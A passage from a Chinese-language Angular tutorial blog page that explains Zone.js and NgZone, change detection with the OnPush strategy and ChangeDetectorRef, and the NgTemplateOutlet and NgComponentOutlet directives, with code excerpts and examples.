<span class="token function">patchTimer</span><span class="token punctuation">(</span>_global<span class="token punctuation">,</span> <span class="token string">'mozRequest'</span><span class="token punctuation">,</span> <span class="token string">'mozCancel'</span><span class="token punctuation">,</span> <span class="token string">'AnimationFrame'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">patchTimer</span><span class="token punctuation">(</span>_global<span class="token punctuation">,</span> <span class="token string">'webkitRequest'</span><span class="token punctuation">,</span> <span class="token string">'webkitCancel'</span><span class="token punctuation">,</span> <span class="token string">'AnimationFrame'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><h3 id="ngzone"><a href="#ngzone" class="header-anchor">#</a> NgZone</h3> <p>NgZone 是基于 Zone 实现的，它是Zone派生出来的一个子Zone，在 Angular 环境内注册的异步事件都运行在这个子 Zone 内 (因为NgZone拥有整个运行环境的执行上下文)，它扩展了自有的一些 API 并添加了一些功能性的方法到它的执行上下文中。</p> <p>在 Angular 源码中，有一个 ApplicationRef_ 类，其作用是用来监听 NgZone 中的 onMicrotaskEmpty 事件，无论何时只要触发这个事件，那么将会执行一个 tick 方法用来告诉 Angular 去执行变化检测，简化版的代码如下：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">class</span> <span class="token class-name">ApplicationRef</span> <span class="token punctuation">{</span> 
  <span class="token keyword">private</span> _views<span class="token operator">:</span> InternalViewRef<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">private</span> zone<span class="token operator">:</span> NgZone</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>zone<span class="token punctuation">.</span>onMicrotaskEmpty<span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>zone<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span> 
              <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">tick</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  
  <span class="token function">tick</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>_runningTick<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'ApplicationRef.tick is called recursively'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>_views<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">view</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> view<span class="token punctuation">.</span><span class="token function">detectChanges</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><p>因为 Zone 内部通过内建的 <strong>symbol</strong> 函数来模拟 Symbol ：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">__symbol__</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token string">'__zone_symbol__'</span> <span class="token operator">+</span> name<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>因此我们可以在浏览器的控制台中运行下面代码获取Zone 打补丁前的方法名</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>window<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">key</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
 <span class="token keyword">if</span><span class="token punctuation">(</span>key<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'zone_symbol'</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>  
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>运行后控制台的输出结果如下：</p> <p><img src="/vuebloger/img/post/2290165551-58cd5cf4e2a37_fix732.png" alt=""></p> <p>总结一下前面所讲的内容：</p> <ul><li>异步操作被安排为任务</li> <li>Zones 跟踪任务的执行</li> <li>Angular 处理由执行异步操作引起的事件</li> <li>Angular 对所有组件执行变化检测，若发生变化则更新视图</li></ul> <h3 id="onpush策略"><a href="#onpush策略" class="header-anchor">#</a> OnPush策略</h3> <p>变化检测前：</p> <p><img src="/vuebloger/img/post/3032408633-58ce98c19ba93_fix732.png" alt=""></p> <p>变化检测时：</p> <p><img src="/vuebloger/img/post/2634958555-58ce98d1a84ec_fix732.png" alt=""></p> <p>当使用 OnPush 策略的时候，若输入属性没有发生变化，组件的变化检测将会被跳过：</p> <p><img src="/vuebloger/img/post/3984699873-58ce98e815740_fix732.png" alt=""></p> <p>当我们使用 OnPush 策略时，需要使用的 Immutable 的数据结构，才能保证程序正常运行。为了提高变化检测的性能，我们应该尽可能在组件中使用 OnPush 策略，为此我们组件中所需的数据，应仅依赖于输入属性。一般我们使用 ChangeDetectorRef 对象提供的 API，来手动控制组件的变化检测行为。</p> <h3 id="changedetectorref"><a href="#changedetectorref" class="header-anchor">#</a> ChangeDetectorRef</h3> <p>ChangeDetectorRef 是组件的变化检测器的引用，我们可以在组件中的通过依赖注入的方式来获取该对象：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> ChangeDetectorRef <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token keyword">class</span> <span class="token class-name">MyComponent</span> <span class="token punctuation">{</span>
    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">private</span> cdRef<span class="token operator">:</span> ChangeDetectorRef</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>ChangeDetectorRef 变化检测类中主要方法有以下几个：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">export</span> abstract <span class="token keyword">class</span> <span class="token class-name">ChangeDetectorRef</span> <span class="token punctuation">{</span>
  abstract <span class="token function">markForCheck</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span>
  abstract <span class="token function">detach</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span>
  abstract <span class="token function">detectChanges</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span>
  abstract <span class="token function">reattach</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><ul><li>markForCheck() - 在组件的 metadata 中如果设置了 changeDetection: ChangeDetectionStrategy.OnPush 条件，那么变化检测不会再次执行，除非手动调用该方法。</li> <li>detach() - 从变化检测树中分离变化检测器，该组件的变化检测器将不再执行变化检测，除非手动调用 reattach() 方法。</li> <li>reattach() - 重新添加已分离的变化检测器，使得该组件及其子组件都能执行变化检测</li> <li>detectChanges() - 从该组件到各个子组件执行一次变化检测</li></ul> <p>变化检测策略总共2种:</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">export</span> declare <span class="token keyword">enum</span> ChangeDetectionStrategy <span class="token punctuation">{</span>
 OnPush <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token comment">// 变化检测器的状态值是 CheckOnce</span>
 Default <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token comment">// 组件默认值 - 变化检测器的状态值是 CheckAlways，即始终执行变化检测</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>变化检测器的状态共有6种：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">export</span> declare <span class="token keyword">enum</span> ChangeDetectorStatus <span class="token punctuation">{</span>
    CheckOnce <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token comment">// 表示在执行detectChanges之后，变化检测器的状态将会变成Checked</span>
    Checked <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token comment">// 表示变化检测将被跳过，直到变化检测器的状态恢复成CheckOnce</span>
    CheckAlways <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token comment">// 表示在执行detectChanges之后，变化检测器的状态始终为CheckAlways</span>
    Detached <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token comment">// 表示该变化检测器树已从根变化检测器树中移除，变化检测将会被跳过</span>
    Errored <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token comment">// 表示在执行变化检测时出现异常</span>
    Destroyed <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token comment">// 表示变化检测器已被销毁</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>markForCheck()</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token class-name">ViewRef_</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">markForCheck</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
  <span class="token keyword">this</span><span class="token punctuation">.</span>_view<span class="token punctuation">.</span><span class="token function">markPathToRootAsCheckOnce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token class-name">AppView</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">markPathToRootAsCheckOnce</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> c <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">isPresent</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> c<span class="token punctuation">.</span>cdMode <span class="token operator">!==</span> ChangeDetectorStatus<span class="token punctuation">.</span>Detached<span class="token punctuation">)</span> <span class="token punctuation">{</span>
       <span class="token keyword">if</span> <span class="token punctuation">(</span>c<span class="token punctuation">.</span>cdMode <span class="token operator">===</span> ChangeDetectorStatus<span class="token punctuation">.</span>Checked<span class="token punctuation">)</span> <span class="token punctuation">{</span>
              c<span class="token punctuation">.</span>cdMode <span class="token operator">=</span> ChangeDetectorStatus<span class="token punctuation">.</span>CheckOnce<span class="token punctuation">;</span>
           <span class="token punctuation">}</span>
           <span class="token keyword">if</span> <span class="token punctuation">(</span>c<span class="token punctuation">.</span>type <span class="token operator">===</span> ViewType<span class="token punctuation">.</span><span class="token constant">COMPONENT</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    c <span class="token operator">=</span> c<span class="token punctuation">.</span>parentView<span class="token punctuation">;</span>
           <span class="token punctuation">}</span>
           <span class="token keyword">else</span> <span class="token punctuation">{</span>
                    c <span class="token operator">=</span> c<span class="token punctuation">.</span>viewContainer <span class="token operator">?</span> 
                       c<span class="token punctuation">.</span>viewContainer<span class="token punctuation">.</span>parentView <span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
           <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><p>detectChanges()</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token class-name">ViewRef_</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">detectChanges</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
   <span class="token keyword">this</span><span class="token punctuation">.</span>_view<span class="token punctuation">.</span><span class="token function">detectChanges</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token function">triggerQueuedAnimations</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token class-name">AppView</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">detectChanges</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">throwOnChange</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
   <span class="token keyword">var</span> s <span class="token operator">=</span> <span class="token function">_scope_check</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>clazz<span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>cdMode <span class="token operator">===</span> ChangeDetectorStatus<span class="token punctuation">.</span>Checked <span class="token operator">||</span>
         <span class="token keyword">this</span><span class="token punctuation">.</span>cdMode <span class="token operator">===</span> ChangeDetectorStatus<span class="token punctuation">.</span>Errored <span class="token operator">||</span>
         <span class="token keyword">this</span><span class="token punctuation">.</span>cdMode <span class="token operator">===</span> ChangeDetectorStatus<span class="token punctuation">.</span>Detached<span class="token punctuation">)</span>
         <span class="token keyword">return</span><span class="token punctuation">;</span>
         
   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>cdMode <span class="token operator">===</span> ChangeDetectorStatus<span class="token punctuation">.</span>Destroyed<span class="token punctuation">)</span> <span class="token punctuation">{</span>
         <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">throwDestroyedError</span><span class="token punctuation">(</span><span class="token string">'detectChanges'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">}</span>
   
        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">detectChangesInternal</span><span class="token punctuation">(</span>throwOnChange<span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>cdMode <span class="token operator">===</span> ChangeDetectorStatus<span class="token punctuation">.</span>CheckOnce<span class="token punctuation">)</span>
         <span class="token keyword">this</span><span class="token punctuation">.</span>cdMode <span class="token operator">=</span> ChangeDetectorStatus<span class="token punctuation">.</span>Checked<span class="token punctuation">;</span>
         <span class="token keyword">this</span><span class="token punctuation">.</span>numberOfChecks<span class="token operator">++</span><span class="token punctuation">;</span>
         <span class="token function">wtfLeave</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br></div></div><p>detach()</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token class-name">ViewRef_</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">detach</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>_view<span class="token punctuation">.</span>cdMode <span class="token operator">=</span> ChangeDetectorStatus<span class="token punctuation">.</span>Detached<span class="token punctuation">;</span> 
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>reattach()</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token class-name">ViewRef_</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">reattach</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>_view<span class="token punctuation">.</span>cdMode <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_originalMode<span class="token punctuation">;</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">markForCheck</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><h2 id="ngtemplateoutlet"><a href="#ngtemplateoutlet" class="header-anchor">#</a> NgTemplateOutlet</h2> <p>指令语法：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span>ng<span class="token operator">-</span>container <span class="token operator">*</span>ngTemplateOutlet<span class="token operator">=</span><span class="token string">&quot;templateRefExp; context: contextExp&quot;</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>ng<span class="token operator">-</span>container<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>该指令用于基于已有的 TemplateRef 对象，插入对应的内嵌视图。在应用 NgTemplateOutlet 指令时，我们可以通过<code>[ngTemplateOutletContext]</code>属性来设置 EmbeddedViewRef 的上下文对象。绑定的上下文应该是一个对象，此外可通过 let 语法来声明绑定上下文对象属性名。</p> <div class="custom-block tip"><p class="custom-block-title">温馨提示</p> <p>若 let 语法未绑定任何属性名，则上下文对象中 $implicit 属性，对应的值将作为默认值。 即 let-name=&quot;$implicit&quot; 与 let-name 是等价的</p></div> <p>使用实例1：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'ng-template-outlet-example'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    &lt;ng-container *ngTemplateOutlet=&quot;greet&quot;&gt;&lt;/ng-container&gt;
    &lt;hr&gt;
    &lt;ng-container *ngTemplateOutlet=&quot;eng; context: myContext&quot;&gt;&lt;/ng-container&gt;
    &lt;hr&gt;
    &lt;ng-container *ngTemplateOutlet=&quot;svk; context: myContext&quot;&gt;&lt;/ng-container&gt;
    &lt;hr&gt;
    &lt;ng-template #greet&gt;&lt;span&gt;Hello&lt;/span&gt;&lt;/ng-template&gt;
    &lt;ng-template #eng let-name&gt;&lt;span&gt;Hello {{name}}!&lt;/span&gt;&lt;/ng-template&gt;
    &lt;ng-template #svk let-person=&quot;localSk&quot;&gt;&lt;span&gt;Ahoj {{person}}!&lt;/span&gt;&lt;/ng-template&gt;
</span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">class</span> <span class="token class-name">NgTemplateOutletExample</span> <span class="token punctuation">{</span>
  myContext <span class="token operator">=</span> <span class="token punctuation">{</span>$implicit<span class="token operator">:</span> <span class="token string">'World'</span><span class="token punctuation">,</span> localSk<span class="token operator">:</span> <span class="token string">'Svet'</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br></div></div><p>使用实例2:</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Component <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'app-root'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    &lt;ng-template #stpl&gt;
      Hello, Semlinker!
    &lt;/ng-template&gt;
    &lt;ng-template #atpl&gt;
      Hello, Angular!
    &lt;/ng-template&gt;
    &lt;div [ngTemplateOutlet]=&quot;atpl&quot;&gt;&lt;/div&gt;
    &lt;div [ngTemplateOutlet]=&quot;stpl&quot;&gt;&lt;/div&gt;
  </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><p>使用实例3：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Component <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span> 
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'app-root'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    &lt;ng-template #stpl let-message=&quot;message&quot;&gt;
      &lt;p&gt;{{message}}&lt;/p&gt;
    &lt;/ng-template&gt;
    &lt;ng-template #atpl let-msg=&quot;message&quot;&gt;
      &lt;p&gt;{{msg}}&lt;/p&gt;
    &lt;/ng-template&gt;
    &lt;ng-template #otpl let-msg&gt;
      &lt;p&gt;{{msg}}&lt;/p&gt;
    &lt;/ng-template&gt;
    &lt;div [ngTemplateOutlet]=&quot;atpl&quot;
      [ngOutletContext]=&quot;context&quot;&gt;
    &lt;/div&gt;
    &lt;div [ngTemplateOutlet]=&quot;stpl&quot;
      [ngOutletContext]=&quot;context&quot;&gt;
    &lt;/div&gt;
    &lt;div [ngTemplateOutlet]=&quot;otpl&quot;
      [ngOutletContext]=&quot;context&quot;&gt; &lt;/div&gt;
  </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span> 
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token punctuation">{</span>
  context <span class="token operator">=</span> <span class="token punctuation">{</span> message<span class="token operator">:</span> <span class="token string">'Hello ngOutletContext!'</span><span class="token punctuation">,</span> 
    $implicit<span class="token operator">:</span> <span class="token string">'Hello, Semlinker!'</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br></div></div><h2 id="ngcomponentoutlet"><a href="#ngcomponentoutlet" class="header-anchor">#</a> NgComponentOutlet</h2> <p>Common 模块自 4.0.0-beta.3 版本引入了 NgComponentOutlet 指令，简化了动态组件的创建过程。API 如下：</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span> <span class="token attr-name">[ngComponentOutlet]</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>componentTypeExpression<span class="token punctuation">&quot;</span></span>
          <span class="token attr-name">[ngComponentOutletInjector]</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>injectorExpression<span class="token punctuation">&quot;</span></span>
          <span class="token attr-name">[ngComponentOutletContent]</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>contentNodesExpression<span class="token punctuation">&quot;</span></span>
          <span class="token attr-name">[ngComponentOutletNgModuleFactory]</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>moduleFactory<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span>
